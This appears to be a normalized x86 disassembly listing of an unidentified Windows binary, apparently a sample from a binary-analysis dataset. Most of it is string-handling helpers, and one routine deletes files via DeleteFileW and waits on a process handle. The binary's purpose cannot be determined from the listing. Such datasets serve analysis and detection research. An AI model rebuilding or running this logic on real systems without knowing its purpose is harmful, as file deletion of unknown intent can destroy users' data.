sub_401014
xor edx edx
cmp [ ecx ] dx
je r-xdata
mov eax edx
retn
push esi
lea esi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax dx
jne r-xdata
mov edx ecx
sub edx esi
sar edx 0x1
pop esi
sub_401133
push edi
mov edi ecx
mov ecx [ esp + 0x8 ]
call sub_40111d
push eax
mov ecx edi
call sub_40111d
mov ecx eax
call sub_4010f2
test al al
je r-xdata
xor eax eax
mov ecx [ esp + 0x8 ]
push esi
call sub_40111a
mov ecx edi
mov esi eax
call sub_40111a
cmp eax esi
pop esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop edi
retn 0x4
sub_40118a
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_401133
leave
retn 0x8
sub_4011a9
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
call sub_40111d
push eax
mov ecx esi
call sub_4010f2
pop esi
test al al
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
call sub_40111a
cmp eax [ esp + 0x8 ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_4011f3
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_40e9f4
pop ecx
test eax eax
mov ecx r--data
cmovne ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4020ad
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_401257
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4011f3
mov ecx [ ebp + 0x8 ]
push r--data
call sub_4020ad
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_4012bf
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_40ea1e
pop ecx
test eax eax
mov ecx r--data
cmovne ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4020ad
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_4012ea
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_40e9f4
pop ecx
test eax eax
je r-xdata
call sub_40131f
call sub_401319
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_401121
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_401325
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_402150
lea ecx [ esi + 0x1c ]
call sub_402150
lea ecx [ esi + 0x34 ]
call sub_402150
lea ecx [ esi + 0x4c ]
call sub_402150
lea ecx [ esi + 0x64 ]
call sub_402150
mov eax esi
pop esi
retn
sub_40140a
push 0x0
mov eax sub_41dbf0
call sub_411378
mov esi ecx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x8 ]
call sub_402291
test al al
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_40223f
call sub_411346
retn 0x18
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x64 ]
call sub_402249
sub_401444
push esi
mov esi ecx
mov ecx [ esi + 0x9c ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x8 ]
call sub_40b540
mov [ esi + 0x9c ] eax
pop esi
retn 0x4
push ecx
call sub_401471
and [ esi + 0x9c ] 0x0
sub_401486
push esi
mov esi ecx
lea ecx [ esi + 0x64 ]
call sub_40223f
lea ecx [ esi + 0x4c ]
call sub_40223f
lea ecx [ esi + 0x34 ]
call sub_40223f
lea ecx [ esi + 0x1c ]
call sub_40223f
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_40223f
sub_4014b2
push 0xffffffff
push sub_41dbc0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x24 ] esi
and [ esp + 0x1c ] 0x0
mov [ esp + 0x28 ] esi
xor ebx ebx
inc ebx
push r--data
mov [ esp + 0x6c ] ebx
call sub_402193
push ecx
push r--data
lea ecx [ esp + 0x78 ]
mov [ esp + 0x24 ] ebx
call sub_40229a
cmp eax 0xffffffff
je r-xdata
push ecx
push r--data
lea ecx [ esp + 0x78 ]
call sub_40229a
cmp eax 0xffffffff
je r-xdata
push r--data
mov ecx esi
call j_sub_402403
push r--data
mov ecx esi
call j_sub_402403
lea ecx [ esp + 0x70 ]
call sub_40228d
push r--data
lea ecx [ esp + 0x48 ]
mov ebp eax
call sub_402193
xor edi edi
mov [ esp + 0x68 ] 0x2
mov [ esp + 0x20 ] 0x0
test ebp ebp
jle r-xdata
push r--data
lea edx [ esp + 0x48 ]
lea ecx [ esp + 0x30 ]
call sub_402e04
pop ecx
push eax
mov ecx esi
mov [ esp + 0x6c ] 0x4
call j_sub_4023f3
lea ecx [ esp + 0x2c ]
call sub_40223f
lea ecx [ esp + 0x44 ]
call sub_40223f
jmp r-xdata
lea esi [ ebp + 0x1 ]
lea ecx [ esp + 0x70 ]
call sub_40223f
mov eax esi
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40eb9e
add esp 0x58
retn
mov [ esp + 0x1b ] 0x0
push ecx
push edi
lea eax [ esp + 0x78 ]
push eax
lea ecx [ esp + 0x38 ]
call sub_402168
mov [ esp + 0x68 ] 0x3
or ebx 0x2
mov ecx eax
mov [ esp + 0x1c ] ebx
call sub_402df8
mov [ esp + 0x1b ] 0x1
test al al
jne r-xdata
mov ecx [ esp + 0x20 ]
cmp [ esp + 0x1b ] 0x0
movzx ecx cl
push 0x1
pop eax
cmovne ecx eax
mov [ esp + 0x20 ] ecx
test cl cl
je r-xdata
and ebx 0xfffffffd
lea ecx [ esp + 0x2c ]
mov [ esp + 0x1c ] ebx
call sub_40223f
mov [ esp + 0x68 ] 0x2
test bl 0x2
je r-xdata
inc edi
cmp edi ebp
jl r-xdata
push edi
lea ecx [ esp + 0x74 ]
call sub_402279
movzx eax [ eax ]
cmp eax 0x20
je r-xdata
lea eax [ edi + 0x5 ]
cmp eax esi
jg r-xdata
mov esi [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_40226b
sub_401672
push 0x184
mov eax sub_41db58
call sub_411378
mov esi ecx
call sub_409464
xor ebx ebx
cmp eax 0x9
ja r-xdata
push r--data
lea ecx [ ebp - 0x190 ]
call sub_4020ad
mov [ ebp - 0x4 ] 0x6
call sub_40918e
lea ecx [ ebp - 0x190 ]
jmp [ eax * 4 + jump_table_4018b6 ]
push r--data
lea ecx [ ebp - 0xe8 ]
call sub_4020ad
mov [ ebp - 0x4 ] ebx
call sub_40918e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xe8 ]
call sub_40211d
mov eax [ esi ]
push 0x15
lea ecx [ ebp - 0x58 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x58 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x148 ]
call sub_4020ad
mov [ ebp - 0x4 ] 0x1
call sub_40918e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x148 ]
call sub_40211d
mov eax [ esi ]
push 0xd
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x88 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x118 ]
call sub_4020ad
mov [ ebp - 0x4 ] 0x2
call sub_40918e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x118 ]
call sub_40211d
mov eax [ esi ]
push 0xe
lea ecx [ ebp - 0xb8 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x178 ]
call sub_4020ad
mov [ ebp - 0x4 ] 0x3
call sub_40918e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x178 ]
call sub_40211d
mov eax [ esi ]
push 0xf
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x28 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_4020ad
mov [ ebp - 0x4 ] 0x4
call sub_40918e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_40211d
mov eax [ esi ]
push 0x10
lea ecx [ ebp - 0x70 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x70 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0xa0 ]
call sub_4020ad
mov [ ebp - 0x4 ] 0x5
call sub_40918e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa0 ]
call sub_40211d
mov eax [ esi ]
push 0x11
lea ecx [ ebp - 0xd0 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0xd0 ]
jmp r-xdata
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
mov eax [ esi ]
lea ecx [ ebp - 0x100 ]
push ecx
mov ecx esi
call [ eax ]
lea ecx [ ebp - 0x100 ]
jmp r-xdata
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
mov eax [ esi ]
lea ecx [ ebp - 0x130 ]
push ecx
mov ecx esi
call [ eax ]
lea ecx [ ebp - 0x130 ]
mov eax [ esi ]
push 0x2
lea ecx [ ebp - 0x160 ]
push ecx
mov ecx esi
mov bl 0x1
call [ eax + 0x4 ]
lea ecx [ ebp - 0x160 ]
jmp r-xdata
call sub_40211d
mov al bl
call sub_411346
retn
call sub_40211d
sub_4018de
push 0xffffffff
push sub_41dcff
mov eax [ fs : 0x0 ]
push eax
sub esp 0x174
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x170 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x188 ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
call sub_408f12
push r--data
lea ecx [ esp + 0xd0 ]
mov [ esp + 0x1b ] al
call sub_402193
sub esp 0x18
mov ecx esp
xor ebx ebx
push esi
mov [ esp + 0x1ac ] ebx
call sub_402193
lea ecx [ esp + 0x54 ]
call sub_4014b2
add esp 0x18
lea ecx [ esp + 0xcc ]
push eax
call sub_4021e3
lea ecx [ esp + 0x3c ]
call sub_40223f
push esi
lea ecx [ esp + 0x40 ]
call sub_402193
push ecx
lea edx [ esp + 0x40 ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x194 ] 0x1
call sub_408d42
pop ecx
push eax
mov edx r--data
lea ecx [ esp + 0x58 ]
mov [ esp + 0x194 ] 0x2
call sub_402e60
pop ecx
mov [ esp + 0x190 ] 0x3
call sub_40918e
lea ecx [ esp + 0x54 ]
call sub_40211d
lea ecx [ esp + 0x18 ]
call sub_40211d
lea ecx [ esp + 0x3c ]
mov [ esp + 0x190 ] bl
call sub_40223f
push ecx
lea edx [ esp + 0xd0 ]
lea ecx [ esp + 0x58 ]
call sub_408d42
pop ecx
push eax
mov edx r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x194 ] 0x4
call sub_402e60
pop ecx
mov [ esp + 0x190 ] 0x5
call sub_40918e
lea ecx [ esp + 0x18 ]
call sub_40211d
lea ecx [ esp + 0x54 ]
mov [ esp + 0x190 ] bl
call sub_40211d
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0x6
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] bl
call sub_40211d
mov eax [ edi ]
lea ecx [ esp + 0x18 ]
push 0x1
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
lea ecx [ esp + 0x6c ]
call sub_408ab4
push 0x50
mov [ esp + 0x194 ] 0x7
call sub_40f24f
mov esi eax
pop ecx
mov [ esp + 0x30 ] esi
mov [ esp + 0x190 ] 0x8
test esi esi
je r-xdata
mov ebp ebx
push ecx
mov ecx esi
call sub_401f65
lea ecx [ esp + 0x6c ]
call j_sub_402624
sub esp 0x18
mov ecx esp
mov [ esp + 0x50 ] esp
push eax
call sub_402193
sub esp 0x18
mov ecx esp
push r--data
mov [ esp + 0x1c4 ] 0x9
call sub_402193
mov ecx esi
mov [ esp + 0x1c0 ] 0x8
call sub_40adea
mov ebp eax
jmp r-xdata
cmp esi 0x5
jne r-xdata
mov ecx ebp
call sub_40b498
test eax eax
jne r-xdata
xor esi esi
mov [ esp + 0x190 ] 0x7
inc esi
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0xa
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0x7
call sub_40211d
inc esi
cmp esi 0x5
jle r-xdata
test edx edx
je r-xdata
mov eax [ edi ]
push 0x4
lea ecx [ esp + 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0xb
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0x7
call sub_40211d
push ecx
lea ecx [ esp + 0xe8 ]
call sub_401f76
lea ecx [ esp + 0xe4 ]
call sub_40bc65
push edi
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x194 ] 0xc
call sub_401444
call sub_40beb0
lea ecx [ esp + 0xe4 ]
call sub_40bd59
mov ecx edi
call sub_401672
test al al
jne r-xdata
mov ecx ebp
call sub_40b2f5
mov edx eax
test edx edx
je r-xdata
cmp [ esp + 0x17 ] 0x0
jne r-xdata
lea ecx [ esp + 0x9c ]
call sub_408b4b
push r--data
lea edx [ esp + 0xa0 ]
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x194 ] 0xd
call sub_402e04
pop ecx
lea edx [ esp + 0xb4 ]
lea ecx [ esp + 0x6c ]
mov [ esp + 0x190 ] 0xe
call sub_408c1a
cmp [ esp + 0x17 ] 0x0
mov ebp [ DeleteFileW@IAT ]
mov [ esp + 0x16 ] al
jne r-xdata
cmp [ esp + 0x17 ] al
jne r-xdata
mov eax [ edi ]
push 0x5
lea ecx [ esp + 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
jmp r-xdata
lea ecx [ esp + 0x6c ]
call j_sub_402624
push eax
call [ DeleteFileW@IAT ]
test al al
mov eax [ edi ]
lea ecx [ esp + 0x18 ]
jne r-xdata
lea ecx [ esp + 0x6c ]
call j_sub_402624
push eax
call ebp
mov al [ esp + 0x16 ]
lea ecx [ esp + 0xe4 ]
call sub_40bcf5
lea ecx [ esp + 0x6c ]
call j_sub_402624
push eax
call [ DeleteFileW@IAT ]
jmp r-xdata
lea ecx [ esp + 0x6c ]
call sub_40223f
lea ecx [ esp + 0xcc ]
call sub_40223f
mov al bl
mov ecx [ esp + 0x188 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x170 ]
xor ecx esp
call sub_40eb9e
add esp 0x180
retn
push 0x6
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
lea ecx [ esp + 0x9c ]
call j_sub_402624
lea ecx [ esp + 0xb4 ]
mov esi eax
call j_sub_402624
mov edx esi
mov ecx eax
call sub_40642e
cmp [ esp + 0x17 ] 0x0
mov esi eax
jne r-xdata
push 0x7
jmp r-xdata
mov eax [ edi ]
lea ecx [ esp + 0x18 ]
test esi esi
je r-xdata
lea ecx [ esp + 0xb4 ]
call j_sub_402624
push eax
call ebp
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
jmp r-xdata
push 0x8
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0xf
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0xe
call sub_40211d
lea eax [ esp + 0x9c ]
push eax
lea ecx [ esp + 0x88 ]
call sub_402127
push r--data
lea ecx [ esp + 0x88 ]
mov [ esp + 0x194 ] 0x10
call j_sub_402403
push r--data
lea ecx [ esp + 0x88 ]
call j_sub_402403
lea eax [ esp + 0xcc ]
push eax
lea ecx [ esp + 0x88 ]
call j_sub_4023f3
lea eax [ esp + 0x16 ]
push eax
lea edx [ esp + 0x34 ]
lea ecx [ esp + 0x88 ]
mov [ esp + 0x34 ] ebx
mov [ esp + 0x1a ] bl
call sub_408fbd
pop ecx
mov [ esp + 0x16 ] al
test al al
je r-xdata
push 0x9
lea ecx [ esp + 0xb4 ]
call sub_40223f
lea ecx [ esp + 0x9c ]
call sub_40223f
mov eax [ edi ]
push 0xb
lea ecx [ esp + 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0x12
call sub_40918e
mov [ esp + 0x190 ] 0x10
push 0x493e0
push [ esp + 0x34 ]
call [ WaitForSingleObject@IAT ]
push [ esp + 0x30 ]
call [ CloseHandle@IAT ]
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0x11
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0x10
call sub_40211d
mov eax [ edi ]
push 0xa
lea ecx [ esp + 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0x84 ]
call sub_40223f
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0x14
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0x10
call sub_40211d
push r--data
lea ecx [ esp + 0x1c ]
call sub_4020ad
mov [ esp + 0x190 ] 0x15
call sub_40918e
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0x10
call sub_40211d
mov eax [ edi ]
push 0xc
lea ecx [ esp + 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ esp + 0x18 ]
call sub_40211d
mov bl 0x1
lea ecx [ esp + 0x18 ]
call sub_40211d
push ecx
lea edx [ esp + 0xa0 ]
lea ecx [ esp + 0x1c ]
call sub_408d42
pop ecx
mov ecx eax
mov [ esp + 0x190 ] 0x13
call sub_40904a
lea ecx [ esp + 0x18 ]
mov [ esp + 0x190 ] 0x10
call sub_40211d
cmp [ esp + 0x16 ] 0x0
je r-xdata
sub_401f76
push esi
mov esi ecx
push ecx
lea ecx [ esi + 0x50 ]
call sub_401fa8
push ecx
lea ecx [ esi + 0x5c ]
call sub_401fa8
push ecx
lea ecx [ esi + 0x68 ]
call sub_401fa8
push ecx
lea ecx [ esi + 0x74 ]
call sub_401fa8
and [ esi + 0x9c ] 0x0
pop esi
retn 0x4
sub_401fbf
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xa4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa0 ] eax
push esi
mov esi [ ebp + 0x10 ]
lea ecx [ esp + 0x20 ]
call sub_401325
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
lea ecx [ esp + 0x38 ]
call sub_40135a
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
lea ecx [ esp + 0x38 ]
call sub_401386
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
lea ecx [ esp + 0x38 ]
call sub_4013b2
sub esp 0x18
mov ecx esp
push r--data
call sub_402193
lea ecx [ esp + 0x38 ]
call sub_4013de
lea ecx [ esp + 0x8 ]
call sub_402150
lea ecx [ esp + 0x8 ]
call sub_40924e
test al al
je r-xdata
lea edx [ esp + 0x20 ]
mov ecx esi
call sub_4018de
lea ecx [ esp + 0x8 ]
call sub_40223f
lea ecx [ esp + 0x20 ]
call sub_401486
mov ecx [ esp + 0xa4 ]
pop esi
xor ecx esp
xor eax eax
call sub_40eb9e
mov esp ebp
pop ebp
retn 0x10
lea ecx [ esp + 0x8 ]
call j_sub_402624
sub esp 0x18
mov ecx esp
push eax
call sub_402193
lea ecx [ esp + 0x38 ]
call sub_40140a
sub_4020ad
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x1 ]
call sub_402385
push eax
mov ecx esi
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_402327
push [ ebp + 0x8 ]
mov ecx esi
call sub_40230a
mov eax esi
pop esi
leave
retn 0x4
sub_4020e0
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x1 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_402396
push eax
mov ecx esi
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_402327
mov ecx [ ebp + 0x8 ]
call sub_402385
push eax
mov ecx esi
call sub_4022b7
mov eax esi
pop esi
leave
retn 0x4
sub_402127
push esi
push ecx
mov esi ecx
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_4025d7
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_40247e
mov eax esi
pop esi
retn 0x4
sub_402168
push esi
push ecx
mov esi ecx
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_4025d7
push 0x5
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
call sub_40247e
mov eax esi
pop esi
retn 0xc
sub_402193
push esi
push ecx
mov esi ecx
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_4025d7
push [ esp + 0x8 ]
mov ecx esi
call sub_402504
mov eax esi
pop esi
retn 0x4
sub_4021b8
push esi
push ecx
mov esi ecx
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_4025d7
mov ecx [ esp + 0x8 ]
call sub_402385
push eax
mov ecx esi
call sub_4023b0
mov eax esi
pop esi
retn 0x4
sub_4021e3
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi ecx
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax edi
pop edi
leave
retn 0x4
push 0x0
push 0x1
call sub_4025d7
call sub_402e89
mov ecx [ ebp + 0x8 ]
test al al
je r-xdata
call sub_402385
push eax
mov ecx edi
call sub_4023b0
push esi
lea eax [ ebp - 0x4 ]
push eax
call sub_402537
mov ecx [ ebp + 0x8 ]
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
call sub_402520
push [ esi ]
mov ecx edi
push [ eax ]
call sub_402e98
pop esi
jmp r-xdata
sub_4022b7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ esi + 0x14 ] 0x10
mov edi ecx
jae r-xdata
push esi
push edi
lea eax [ ebp + 0xb ]
push eax
call sub_402396
mov ecx eax
call sub_402ecd
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
push eax
push esi
push edi
call sub_4010b6
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
push 0x0
push 0x0
mov ecx esi
mov [ edi + 0x14 ] eax
call sub_402327
pop edi
pop esi
pop ebp
retn 0x4
sub_402327
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x14 ] 0xf
call sub_402695
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx [ esi ]
jbe r-xdata
mov eax [ esi + 0x14 ]
inc eax
push eax
push ebx
lea eax [ ebp + 0xb ]
push eax
mov ecx esi
call sub_402396
mov ecx eax
call j_sub_402aa9
pop ebx
push [ ebp + 0xc ]
push ebx
call sub_402eeb
pop ecx
push eax
push esi
call sub_4010a2
add esp 0xc
sub_4023b0
push esi
mov esi [ esp + 0x8 ]
push edi
cmp [ esi + 0x14 ] 0x8
mov edi ecx
jae r-xdata
push esi
push edi
call sub_402ef0
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
push eax
mov edx esi
call sub_401060
pop ecx
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
push 0x0
push 0x0
mov ecx esi
mov [ edi + 0x14 ] eax
call sub_4025d7
pop edi
pop esi
retn 0x4
sub_40241f
push esi
mov esi ecx
or eax 0xffffffff
mov ecx [ esi + 0x10 ]
push edi
mov edi [ esp + 0xc ]
sub eax ecx
cmp eax edi
jbe r-xdata
call sub_402971
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x8
push ebx
lea ebx [ ecx + edi ]
push 0x0
push ebx
mov ecx esi
call sub_40290f
test al al
je r-xdata
pop ebx
push [ esp + 0x14 ]
mov ecx esi
push edi
push [ esi + 0x10 ]
call sub_4028b3
push ebx
mov ecx esi
call sub_4028eb
sub_40247e
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
call sub_40228d
mov esi [ ebp + 0xc ]
cmp eax esi
jb r-xdata
call sub_4026bc
mov ecx [ ebp + 0x8 ]
call sub_40228d
mov ebx eax
sub ebx esi
cmp [ ebp + 0x10 ] ebx
mov ecx edi
cmovb ebx [ ebp + 0x10 ]
cmp edi [ ebp + 0x8 ]
jne r-xdata
push 0x0
push ebx
call sub_40290f
test al al
je r-xdata
lea eax [ ebx + esi ]
push eax
call sub_402842
push esi
push 0x0
mov ecx edi
call sub_402860
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
push ebx
call sub_402624
mov ecx edi
lea esi [ eax + esi * 2 ]
call sub_402624
mov edx esi
mov ecx eax
call sub_401034
pop ecx
push ebx
mov ecx edi
call sub_4028eb
sub_402558
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp ecx
test ebx ebx
jne r-xdata
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
cmp ebx edi
ja r-xdata
pop ebp
pop ebx
retn 0xc
xor eax eax
inc eax
sub eax ebx
add edi eax
call sub_402624
jmp r-xdata
push [ esp + 0x14 ]
mov edx edi
mov ecx eax
mov [ esp + 0x20 ] eax
call sub_40104a
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov edx [ esp + 0x14 ]
push ebx
mov ecx esi
call sub_401005
pop ecx
test eax eax
je r-xdata
mov ecx ebp
call sub_402624
sub esi eax
sar esi 0x1
mov eax esi
jmp r-xdata
mov ecx esi
sub ecx [ esp + 0x1c ]
or eax 0xffffffff
sar ecx 0x1
sub eax ecx
add edi eax
lea eax [ esi + 0x2 ]
pop edi
pop esi
sub_4025d7
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x14 ] 0x7
call sub_4028eb
pop esi
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esi ]
jbe r-xdata
push ecx
push ebx
call j_sub_402aa9
pop ebx
push [ esp + 0x10 ]
mov ecx ebx
call sub_402385
mov edx eax
mov ecx esi
call sub_401034
pop ecx
sub_402636
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_402a7a
mov ecx esi
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
call sub_402a16
test al al
je r-xdata
push [ ebp + 0xc ]
call sub_40239d
sub edi eax
push edi
push esi
mov ecx esi
call sub_40298f
jmp r-xdata
mov eax esi
push [ ebp + 0xc ]
mov ecx esi
push edi
call sub_40239d
push eax
call sub_4010a2
add esp 0xc
mov ecx esi
push [ ebp + 0xc ]
call sub_402695
pop edi
pop esi
pop ebp
retn 0x8
sub_402695
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
mov [ ecx + 0x10 ] esi
call sub_40239d
add eax esi
push eax
call sub_4010ca
pop ecx
pop ecx
pop esi
leave
retn 0x4
sub_4026d7
push ebx
push edi
mov edi ecx
mov ecx [ esp + 0xc ]
call sub_40228d
mov ebx [ esp + 0x10 ]
cmp eax ebx
jb r-xdata
call sub_4026bc
mov ecx [ esp + 0xc ]
push esi
call sub_40228d
mov esi [ esp + 0x18 ]
mov ecx [ edi + 0x10 ]
sub eax ebx
cmp eax esi
cmovb esi eax
or eax 0xffffffff
sub eax ecx
cmp eax esi
jbe r-xdata
call sub_402971
test esi esi
je r-xdata
pop esi
mov eax edi
pop edi
pop ebx
retn 0xc
push ebp
lea ebp [ ecx + esi ]
push 0x0
push ebp
mov ecx edi
call sub_40290f
test al al
je r-xdata
pop ebp
mov ecx [ esp + 0x14 ]
push esi
call sub_402624
mov ecx edi
lea esi [ eax + ebx * 2 ]
call sub_402624
mov ecx [ edi + 0x10 ]
mov edx esi
